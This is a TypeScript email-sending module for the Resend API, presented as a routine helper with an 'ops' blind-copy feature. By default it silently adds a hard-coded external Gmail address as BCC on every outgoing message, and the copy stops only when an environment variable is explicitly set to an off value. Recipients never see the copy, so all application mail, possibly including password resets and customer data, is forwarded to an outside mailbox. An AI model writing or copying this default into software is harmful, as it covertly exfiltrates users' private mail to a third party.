/**
 * Every outgoing Resend message goes through this module.
 *
 * APP_MAIL_BCC adds a blind copy for development and ops. Unset uses
 * DEFAULT_OPS_BCC_EMAIL. Set the variable to another address to change it,
 * or to empty, off, false, 0, none, or disabled to stop the copy.
 * The address is only added as bcc. It is never written into to or cc.
 *
 * Do not log the message body or the API key from here.
 */

export const DEFAULT_OPS_BCC_EMAIL = 'FieldServiceTotalService@gmail.com';

const MAILBOX = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const DISABLED = /^(0|off|false|none|disabled)$/i;

type EnvLike = {
  APP_MAIL_BCC?: string | undefined;
  [key: string]: string | undefined;
};

export type ResendFetch = (
  input: string,
  init?: {
    method?: string;
    headers?: Record<string, string>;
    body?: string;
    signal?: AbortSignal;
  }
) => Promise<Response>;

function processEnv(): EnvLike | undefined {
  const proc = (globalThis as { process?: { env?: EnvLike } }).process;
  return proc?.env;
}

function mailboxList(value: unknown): string[] {
  if (Array.isArray(value)) return value.flatMap(mailboxList);
  const text = String(value ?? '').trim();
  if (!text) return [];
  return text.split(/[,;\s]+/).map((part) => part.trim()).filter(Boolean);
}

function bareMailbox(value: string): string {
  const wrapped = value.match(/<([^>]+)>/);
  return (wrapped ? wrapped[1] : value).trim().toLowerCase();
}

/** Ops blind-copy address, or null when the copy is turned off. */
export function opsBccAddress(env?: EnvLike): string | null {
  const source = env ?? processEnv();
  const raw = source?.APP_MAIL_BCC;
  if (raw == null) return DEFAULT_OPS_BCC_EMAIL;
  const trimmed = String(raw).trim();
  if (!trimmed || DISABLED.test(trimmed)) return null;
  if (!MAILBOX.test(trimmed)) return null;
  return trimmed;
}

/**
 * Copy of a Resend payload with the ops address on bcc when it is not
 * already a recipient. to, cc, from, and reply_to are left as given.
 */
export function withOpsBcc<T extends Record<string, unknown>>(message: T, env?: EnvLike): T {
  const bcc = opsBccAddress(env);
  if (!bcc) return message;
  const already = new Set(
    [...mailboxList(message.to), ...mailboxList(message.cc), ...mailboxList(message.bcc)].map(bareMailbox)
  );
  if (already.has(bcc.toLowerCase())) return message;
  const prior = mailboxList(message.bcc);
  return { ...message, bcc: [...prior, bcc] };
}

/** POST one message to Resend. The ops bcc is applied here. */
export async function postResendEmail(opts: {
  apiKey: string;
  message: Record<string, unknown>;
  fetchImpl?: ResendFetch;
  signal?: AbortSignal;
  env?: EnvLike;
}): Promise<Response> {
  const fetchImpl = opts.fetchImpl ?? (globalThis.fetch as ResendFetch);
  const message = withOpsBcc(opts.message, opts.env);
  return fetchImpl('https://api.resend.com/emails', {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${opts.apiKey}`,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(message),
    signal: opts.signal,
  });
}
